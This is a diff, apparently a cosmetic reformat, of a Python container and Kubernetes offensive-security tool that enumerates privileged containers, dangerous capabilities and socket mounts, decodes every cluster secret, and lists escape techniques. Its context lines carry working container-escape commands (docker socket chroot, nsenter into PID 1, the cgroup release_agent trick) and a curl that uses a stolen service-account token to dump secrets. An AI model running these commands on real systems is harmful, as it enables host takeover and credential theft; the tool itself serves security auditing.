@@ -73,7 +73,9 @@ class DockerEnumerator:
             try:
                 result = subprocess.run(
                     ["docker", "ps", "--format", "{{json .}}"],
-                    capture_output=True, text=True, timeout=10,
+                    capture_output=True,
+                    text=True,
+                    timeout=10,
                 )
                 containers: list[dict[str, Any]] = []
                 for line in result.stdout.strip().split("\n"):
@@ -95,7 +97,9 @@ class DockerEnumerator:
             try:
                 result = subprocess.run(
                     ["docker", "images", "--format", "{{json .}}"],
-                    capture_output=True, text=True, timeout=10,
+                    capture_output=True,
+                    text=True,
+                    timeout=10,
                 )
                 images: list[dict[str, Any]] = []
                 for line in result.stdout.strip().split("\n"):
@@ -117,7 +121,9 @@ class DockerEnumerator:
             try:
                 result = subprocess.run(
                     ["docker", "inspect", container_id],
-                    capture_output=True, text=True, timeout=10,
+                    capture_output=True,
+                    text=True,
+                    timeout=10,
                 )
                 if result.returncode == 0:
                     return json.loads(result.stdout)[0]
@@ -138,25 +144,35 @@ class DockerEnumerator:
             if details:
                 host_config = details.get("HostConfig", {})
                 if host_config.get("Privileged", False):
-                    privileged.append({
-                        "id": cid[:12],
-                        "name": details.get("Name", ""),
-                        "image": details.get("Config", {}).get("Image", ""),
-                        "privileged": True,
-                        "capabilities": host_config.get("CapAdd", []),
-                        "host_pid": host_config.get("PidMode", ""),
-                        "mounts": [
-                            m.get("Source", "") + ":" + m.get("Destination", "")
-                            for m in details.get("Mounts", [])
-                        ],
-                    })
+                    privileged.append(
+                        {
+                            "id": cid[:12],
+                            "name": details.get("Name", ""),
+                            "image": details.get("Config", {}).get("Image", ""),
+                            "privileged": True,
+                            "capabilities": host_config.get("CapAdd", []),
+                            "host_pid": host_config.get("PidMode", ""),
+                            "mounts": [
+                                m.get("Source", "") + ":" + m.get("Destination", "") for m in details.get("Mounts", [])
+                            ],
+                        }
+                    )
         return privileged
 
     def check_sensitive_mounts(self) -> list[dict[str, Any]]:
         """Find containers with sensitive host path mounts."""
         sensitive_paths = [
-            "/", "/root", "/home", "/etc", "/var/run", "/proc",
-            "/sys", "/dev", "/var/log", "/opt", "/usr/bin",
+            "/",
+            "/root",
+            "/home",
+            "/etc",
+            "/var/run",
+            "/proc",
+            "/sys",
+            "/dev",
+            "/var/log",
+            "/opt",
+            "/usr/bin",
         ]
         containers = self.list_containers()
         findings: list[dict[str, Any]] = []
@@ -166,13 +182,15 @@ class DockerEnumerator:
             if details:
                 for mount in details.get("Mounts", []):
                     if any(mount.get("Source", "").startswith(sp) for sp in sensitive_paths):
-                        findings.append({
-                            "container_id": cid[:12],
-                            "container_name": details.get("Name", ""),
-                            "mount_source": mount.get("Source", ""),
-                            "mount_dest": mount.get("Destination", ""),
-                            "mode": mount.get("Mode", ""),
-                        })
+                        findings.append(
+                            {
+                                "container_id": cid[:12],
+                                "container_name": details.get("Name", ""),
+                                "mount_source": mount.get("Source", ""),
+                                "mount_dest": mount.get("Destination", ""),
+                                "mode": mount.get("Mode", ""),
+                            }
+                        )
         return findings
 
     def check_docker_socket_mount(self) -> list[dict[str, Any]]:
@@ -185,21 +203,31 @@ class DockerEnumerator:
             if details:
                 for mount in details.get("Mounts", []):
                     if "docker.sock" in mount.get("Source", ""):
-                        findings.append({
-                            "container_id": cid[:12],
-                            "container_name": details.get("Name", ""),
-                            "docker_socket_mounted": True,
-                            "escape_possible": True,
-                            "technique": "docker run -v /:/host --privileged --pid=host alpine chroot /host",
-                        })
+                        findings.append(
+                            {
+                                "container_id": cid[:12],
+                                "container_name": details.get("Name", ""),
+                                "docker_socket_mounted": True,
+                                "escape_possible": True,
+                                "technique": "docker run -v /:/host --privileged --pid=host alpine chroot /host",
+                            }
+                        )
         return findings
 
     def check_capabilities(self) -> list[dict[str, Any]]:
         """Find containers with dangerous Linux capabilities."""
         dangerous_caps = {
-            "SYS_ADMIN", "SYS_PTRACE", "SYS_MODULE", "DAC_READ_SEARCH",
-            "DAC_OVERRIDE", "NET_ADMIN", "NET_RAW", "IPC_LOCK",
-            "SYS_RAWIO", "SYS_BOOT", "SYSLOG",
+            "SYS_ADMIN",
+            "SYS_PTRACE",
+            "SYS_MODULE",
+            "DAC_READ_SEARCH",
+            "DAC_OVERRIDE",
+            "NET_ADMIN",
+            "NET_RAW",
+            "IPC_LOCK",
+            "SYS_RAWIO",
+            "SYS_BOOT",
+            "SYSLOG",
         }
         containers = self.list_containers()
         findings: list[dict[str, Any]] = []
@@ -210,11 +238,13 @@ class DockerEnumerator:
                 caps = set(details.get("HostConfig", {}).get("CapAdd", []))
                 dangerous = caps & dangerous_caps
                 if dangerous:
-                    findings.append({
-                        "container_id": cid[:12],
-                        "container_name": details.get("Name", ""),
-                        "dangerous_capabilities": sorted(dangerous),
-                    })
+                    findings.append(
+                        {
+                            "container_id": cid[:12],
+                            "container_name": details.get("Name", ""),
+                            "dangerous_capabilities": sorted(dangerous),
+                        }
+                    )
         return findings
 
     def full_check(self) -> dict[str, Any]:
@@ -245,6 +275,7 @@ class K8sEnumerator:
         if os.path.exists(self.kubeconfig):
             try:
                 import yaml
+
                 with open(self.kubeconfig) as f:
                     return yaml.safe_load(f)
             except Exception:
@@ -257,6 +288,7 @@ class K8sEnumerator:
                 return None
             try:
                 import requests
+
                 resp = requests.get(
                     f"{self.api_server}{path}",
                     headers={"Authorization": f"Bearer {self.token}"},
@@ -274,7 +306,9 @@ class K8sEnumerator:
             try:
                 result = subprocess.run(
                     ["kubectl", "get", path.lstrip("/").replace("/", " "), "-o", "json"],
-                    capture_output=True, text=True, timeout=10,
+                    capture_output=True,
+                    text=True,
+                    timeout=10,
                 )
                 if result.returncode == 0:
                     return json.loads(result.stdout)
@@ -336,7 +370,9 @@ class K8sEnumerator:
         try:
             result = subprocess.run(
                 ["kubectl", "get", "pods", "--all-namespaces" if not namespace else f"-n={namespace}", "-o", "json"],
-                capture_output=True, text=True, timeout=10,
+                capture_output=True,
+                text=True,
+                timeout=10,
             )
             if result.returncode == 0:
                 data = json.loads(result.stdout)
@@ -356,7 +392,9 @@ class K8sEnumerator:
         try:
             result = subprocess.run(
                 ["kubectl", "get", "namespaces", "-o", "json"],
-                capture_output=True, text=True, timeout=10,
+                capture_output=True,
+                text=True,
+                timeout=10,
             )
             if result.returncode == 0:
                 data = json.loads(result.stdout)
@@ -376,7 +414,9 @@ class K8sEnumerator:
         try:
             result = subprocess.run(
                 ["kubectl", "get", "secrets", "--all-namespaces" if not namespace else f"-n={namespace}", "-o", "json"],
-                capture_output=True, text=True, timeout=10,
+                capture_output=True,
+                text=True,
+                timeout=10,
             )
             if result.returncode == 0:
                 data = json.loads(result.stdout)
@@ -385,18 +425,21 @@ class K8sEnumerator:
                     decoded = {}
                     if "data" in secret:
                         import base64
+
                         for key, value in secret["data"].items():
                             try:
                                 decoded[key] = base64.b64decode(value).decode()
                             except Exception:
                                 decoded[key] = "[binary]"
-                    secrets.append({
-                        "name": secret["metadata"]["name"],
-                        "namespace": secret["metadata"]["namespace"],
-                        "type": secret.get("type", ""),
-                        "data_keys": list(secret.get("data", {}).keys()),
-                        "decoded": decoded,
-                    })
+                    secrets.append(
+                        {
+                            "name": secret["metadata"]["name"],
+                            "namespace": secret["metadata"]["namespace"],
+                            "type": secret.get("type", ""),
+                            "data_keys": list(secret.get("data", {}).keys()),
+                            "decoded": decoded,
+                        }
+                    )
                 return secrets
         except (FileNotFoundError, subprocess.TimeoutExpired):
             pass
@@ -405,12 +448,14 @@ class K8sEnumerator:
         if data:
             secrets: list[dict[str, Any]] = []
             for secret in data.get("items", []):
-                secrets.append({
-                    "name": secret["metadata"]["name"],
-                    "namespace": secret["metadata"]["namespace"],
-                    "type": secret.get("type", ""),
-                    "data_keys": list(secret.get("data", {}).keys()),
-                })
+                secrets.append(
+                    {
+                        "name": secret["metadata"]["name"],
+                        "namespace": secret["metadata"]["namespace"],
+                        "type": secret.get("type", ""),
+                        "data_keys": list(secret.get("data", {}).keys()),
+                    }
+                )
             return secrets
         return []
 
@@ -421,25 +466,33 @@ class K8sEnumerator:
         try:
             result = subprocess.run(
                 ["kubectl", "get", "sa", "--all-namespaces" if not namespace else f"-n={namespace}", "-o", "json"],
-                capture_output=True, text=True, timeout=10,
+                capture_output=True,
+                text=True,
+                timeout=10,
             )
             if result.returncode == 0:
                 data = json.loads(result.stdout)
-                return [{
-                    "name": sa["metadata"]["name"],
-                    "namespace": sa["metadata"]["namespace"],
-                    "secrets": [s["name"] for s in sa.get("secrets", [])],
-                } for sa in data.get("items", [])]
+                return [
+                    {
+                        "name": sa["metadata"]["name"],
+                        "namespace": sa["metadata"]["namespace"],
+                        "secrets": [s["name"] for s in sa.get("secrets", [])],
+                    }
+                    for sa in data.get("items", [])
+                ]
         except (FileNotFoundError, subprocess.TimeoutExpired):
             pass
 
         data = self._get_k8s_api(api_path)
         if data:
-            return [{
-                "name": sa["metadata"]["name"],
-                "namespace": sa["metadata"]["namespace"],
-                "secrets": [s["name"] for s in sa.get("secrets", [])],
-            } for sa in data.get("items", [])]
+            return [
+                {
+                    "name": sa["metadata"]["name"],
+                    "namespace": sa["metadata"]["namespace"],
+                    "secrets": [s["name"] for s in sa.get("secrets", [])],
+                }
+                for sa in data.get("items", [])
+            ]
         return []
 
     def check_rbac(self) -> dict[str, Any]:
@@ -448,7 +501,9 @@ class K8sEnumerator:
         try:
             result = subprocess.run(
                 ["kubectl", "auth", "can-i", "--list"],
-                capture_output=True, text=True, timeout=10,
+                capture_output=True,
+                text=True,
+                timeout=10,
             )
             if result.returncode == 0:
                 for line in result.stdout.strip().split("\n"):
@@ -464,7 +519,9 @@ class K8sEnumerator:
                 cluster_admin = True
 
         return {
-            "can_list_secrets": any("secrets" in " ".join(r["resource"]) and r["verb"] in ("get", "list", "*") for r in rules),
+            "can_list_secrets": any(
+                "secrets" in " ".join(r["resource"]) and r["verb"] in ("get", "list", "*") for r in rules
+            ),
             "can_create_pods": any("pods" in " ".join(r["resource"]) and r["verb"] in ("create", "*") for r in rules),
             "cluster_admin": cluster_admin,
             "raw_rules": rules,
@@ -475,37 +532,43 @@ class K8sEnumerator:
         findings: list[ContainerFinding] = []
         host_pid = os.path.exists("/proc/1/root") and os.path.samefile("/proc/1/root", "/")
         if host_pid:
-            findings.append(ContainerFinding(
-                resource=ContainerResource("pod", "current"),
-                severity="HIGH",
-                title="Host PID namespace accessible",
-                description="The container shares the host PID namespace. Process injection into host processes is possible.",
-                mitre_technique="T1611",
-                exploitation="nsenter --target 1 --mount --uts --ipc --net --pid -- bash",
-            ))
+            findings.append(
+                ContainerFinding(
+                    resource=ContainerResource("pod", "current"),
+                    severity="HIGH",
+                    title="Host PID namespace accessible",
+                    description="The container shares the host PID namespace. Process injection into host processes is possible.",
+                    mitre_technique="T1611",
+                    exploitation="nsenter --target 1 --mount --uts --ipc --net --pid -- bash",
+                )
+            )
 
         if os.path.exists("/var/run/docker.sock"):
-            findings.append(ContainerFinding(
-                resource=ContainerResource("pod", "current"),
-                severity="CRITICAL",
-                title="Docker socket mounted",
-                description="The Docker socket is accessible. Full host compromise via container escape.",
-                mitre_technique="T1610",
-                exploitation="docker run -v /:/host -it alpine chroot /host",
-            ))
+            findings.append(
+                ContainerFinding(
+                    resource=ContainerResource("pod", "current"),
+                    severity="CRITICAL",
+                    title="Docker socket mounted",
+                    description="The Docker socket is accessible. Full host compromise via container escape.",
+                    mitre_technique="T1610",
+                    exploitation="docker run -v /:/host -it alpine chroot /host",
+                )
+            )
 
         if os.path.exists("/var/run/secrets/kubernetes.io/serviceaccount/token"):
             try:
                 with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as f:
                     token = f.read().strip()
-                findings.append(ContainerFinding(
-                    resource=ContainerResource("pod", "current"),
-                    severity="MEDIUM",
-                    title="Service account token found",
-                    description=f"K8s service account token is mounted. Token: {token[:20]}...",
-                    mitre_technique="T1528",
-                    exploitation="kubectl --token=$TOKEN --server=https://kubernetes.default get secrets --all-namespaces",
-                ))
+                findings.append(
+                    ContainerFinding(
+                        resource=ContainerResource("pod", "current"),
+                        severity="MEDIUM",
+                        title="Service account token found",
+                        description=f"K8s service account token is mounted. Token: {token[:20]}...",
+                        mitre_technique="T1528",
+                        exploitation="kubectl --token=$TOKEN --server=https://kubernetes.default get secrets --all-namespaces",
+                    )
+                )
             except Exception:
                 pass
 
@@ -583,9 +646,9 @@ class ContainerEscapeTechniques:
                 "mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && "
                 "mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && "
                 "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab) && "
-                "echo \"$host_path/cmd\" > /tmp/cgrp/release_agent && "
+                'echo "$host_path/cmd" > /tmp/cgrp/release_agent && '
                 "echo '#!/bin/sh' > /cmd && echo \"id > $host_path/output\" >> /cmd && "
-                "chmod +x /cmd && sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\""
+                'chmod +x /cmd && sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"'
             ),
             "mitre": "T1611",
             "requires": ["SYS_ADMIN"],
@@ -610,7 +673,7 @@ class ContainerEscapeTechniques:
             "command": (
                 "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && "
                 "APISERVER=https://kubernetes.default && "
-                "curl -sk -H \"Authorization: Bearer $TOKEN\" $APISERVER/api/v1/secrets"
+                'curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets'
             ),
             "mitre": "T1528",
             "requires": ["k8s_sa_token"],
@@ -663,7 +726,9 @@ class ContainerEscapeTechniques:
             try:
                 result = subprocess.run(
                     ["sh", "-c", "cat /proc/self/status | grep -i seccomp"],
-                    capture_output=True, text=True, timeout=2,
+                    capture_output=True,
+                    text=True,
+                    timeout=2,
                 )
                 if "0" in result.stdout:
                     privileged = True
@@ -685,6 +750,7 @@ class ContainerEscapeTechniques:
 
 try:
     import requests as _requests  # noqa: F401
+
     HAS_REQUESTS = True
 except ImportError:
     HAS_REQUESTS = False
@@ -749,6 +815,7 @@ class ContainerRuntimeDetector:
 
             for file_pattern in sigs.get("files", []):
                 import glob
+
                 matches = glob.glob(file_pattern)
                 if matches:
                     scores[runtime] += 2
@@ -783,7 +850,9 @@ class ContainerRuntimeDetector:
                 try:
                     result = subprocess.run(
                         ["pgrep", "-f", proc_hint],
-                        capture_output=True, text=True, timeout=3,
+                        capture_output=True,
+                        text=True,
+                        timeout=3,
                     )
                     if result.stdout.strip():
                         scores[runtime] += 1
@@ -873,7 +942,10 @@ class ContainerRuntimeDetector:
         found: list[str] = []
         try:
             result = subprocess.run(
-                ["capsh", "--print"], capture_output=True, text=True, timeout=5,
+                ["capsh", "--print"],
+                capture_output=True,
+                text=True,
+                timeout=5,
             )
             current_caps = set()
             for line in result.stdout.splitlines():
@@ -887,18 +959,26 @@ class ContainerRuntimeDetector:
         except Exception:
             try:
                 result = subprocess.run(
-                    ["cat", "/proc/self/status"], capture_output=True, text=True, timeout=2,
+                    ["cat", "/proc/self/status"],
+                    capture_output=True,
+                    text=True,
+                    timeout=2,
                 )
                 for line in result.stdout.splitlines():
                     if "CapEff:" in line:
                         cap_hex = line.split(":")[1].strip()
                         cap_int = int(cap_hex, 16)
                         bit_index: dict[str, int] = {
-                            "CAP_SYS_ADMIN": 21, "CAP_SYS_PTRACE": 19,
-                            "CAP_DAC_READ_SEARCH": 2, "CAP_DAC_OVERRIDE": 1,
-                            "CAP_NET_ADMIN": 12, "CAP_NET_RAW": 13,
-                            "CAP_SYS_CHROOT": 18, "CAP_SYSLOG": 34,
-                            "CAP_SYS_MODULE": 16, "CAP_SYS_RAWIO": 17,
+                            "CAP_SYS_ADMIN": 21,
+                            "CAP_SYS_PTRACE": 19,
+                            "CAP_DAC_READ_SEARCH": 2,
+                            "CAP_DAC_OVERRIDE": 1,
+                            "CAP_NET_ADMIN": 12,
+                            "CAP_NET_RAW": 13,
+                            "CAP_SYS_CHROOT": 18,
+                            "CAP_SYSLOG": 34,
+                            "CAP_SYS_MODULE": 16,
+                            "CAP_SYS_RAWIO": 17,
                         }
                         for cap_name, bit in bit_index.items():
                             if cap_int & (1 << bit):
@@ -963,10 +1043,14 @@ class ContainerRuntimeDetector:
             "escape_possible": escape_possible,
             "escape_score": min(score, 100),
             "assessment_summary": (
-                "CRITICAL: Immediate escape possible" if score >= 90
-                else "HIGH: Multiple escape vectors detected" if score >= 70
-                else "MEDIUM: Potential escape vectors found" if score >= 30
-                else "LOW: Limited escape opportunities detected" if score > 0
+                "CRITICAL: Immediate escape possible"
+                if score >= 90
+                else "HIGH: Multiple escape vectors detected"
+                if score >= 70
+                else "MEDIUM: Potential escape vectors found"
+                if score >= 30
+                else "LOW: Limited escape opportunities detected"
+                if score > 0
                 else "NONE: No obvious escape vectors found"
             ),
         }
